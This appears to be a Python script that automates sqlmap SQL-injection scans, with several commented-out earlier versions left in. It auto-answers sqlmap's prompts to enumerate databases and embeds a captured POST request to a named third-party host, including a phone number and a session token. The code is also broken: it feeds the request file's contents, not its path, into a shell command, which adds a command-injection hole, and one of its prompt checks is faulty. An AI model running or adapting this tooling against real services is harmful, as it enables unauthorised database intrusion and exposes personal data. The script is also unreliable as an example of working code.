import subprocess
import os
# def scan_with_sqlmap(file_path):
#     cmd = f"sqlmap -r {file_path} --dbs"
#     cmd = ['sqlmap', '-r', 'C:/Users/86185/Desktop/mimt/sqlmap/batchDeleteShippingAddress.txt', '--dbs']
#
#     print(cmd)
#     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#     output, error = process.communicate()
#     print(output.decode())

# def scan_with_sqlmap(file_path):

    # cmd ="sqlmap --dbs"
    # print(cmd)
    # with open(file_path, 'r') as file:
    #     print(file.read())
    #     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    #     output, error = process.communicate(input=file.read().encode())
    #     print(output.decode())
    # command = ['sqlmap', '--dbs']
    # with open(file_path, 'r') as f:
    #     process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
    #     output, _ = process.communicate(input=f.read())
    #
    # # 打印输出结果
    # print(output)
    # cmd = "sqlmap --data '$(cat C:/Users/86185/Desktop/mimt/sqlmap/batchDeleteShippingAddress.txt)' --dbs"
    # #cmd = ['sqlmap', '-r', 'C:/Users/86185/Desktop/mimt/sqlmap/batchDeleteShippingAddress.txt', '-dbs']
    # proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # stdout, stderr = proc.communicate()
    # print(stdout)
    # print(stderr)
    # return stdout, stderr


import subprocess

def run_sqlmap(file_path):
    with open(file_path, 'r', encoding="utf-8") as f:
        data = f.read()
    command = f"sqlmap -r {data} --dbs"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    print(command)
    while True:
        

        output = process.stdout.readline().strip()
        # error = process.communicate()
        # print(error)
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output)

            # 判断输出中的提示信息并自动回应
            if 'continue?' in output:
                answer = 'c'  # 根据需要设置回应为N或其他值
                process.stdin.write(answer + '\n')
                process.stdin.flush()

            elif 'token' and 'y/n'in output:
                answer = 'n'  # 根据需要设置回应为N或其他值
                process.stdin.write(answer + '\n')
                process.stdin.flush()
            elif 'y/n' in output and 'token' not in output:
                answer = 'y'  # 根据需要设置回应为N或其他值
                process.stdin.write(answer + '\n')
                process.stdin.flush()


    process.wait()

# 示例用法
url = "目标URL"



# 文件路径
list = [
"POST /package/addConsigneeAddress.do HTTP/1.1",
"Host:albbapi.fhd001.com",
"User - Agent: None",
"Content - Type: None",
" ",
"consigneeName = 444 & consigneeMobile = 18824543810 & consigneePhone = & consigneeProvince = % E7 % 94 % 98 % E8 % 82 % 83 % E7 % 9C % 81 & consigneeCity = % E5 % BA % 86 % E9 % 98 % B3 % E5 % B8 % 82 & consigneeArea = % E5 % AE % 81 % E5 % 8E % BF & consigneeAddress = % E6 % 96 % AF % E5 % 85 % B0 % E6 % 96 % AF % E5 % 85 % B0881 & consigneeZip = & referer = albbportal & token = % 257EAVUBCQFZDVINABRVDwhDVhVFAAtFXEVGAVQeUVVRFQFLFlZWRQhHFwUEFAVPUAELXwRQVwADDgQG % 257E1 % 257E"
]
a = os.getcwd()+'/sqlmap/batchDeleteShippingAddress.txt'

file_path = 'C:/Users/86185/Desktop/mimt/sqlmap/batchDeleteShippingAddress.txt'




# 执行SQLMap扫描
# scan_with_sqlmap(file_path)

run_sqlmap(file_path)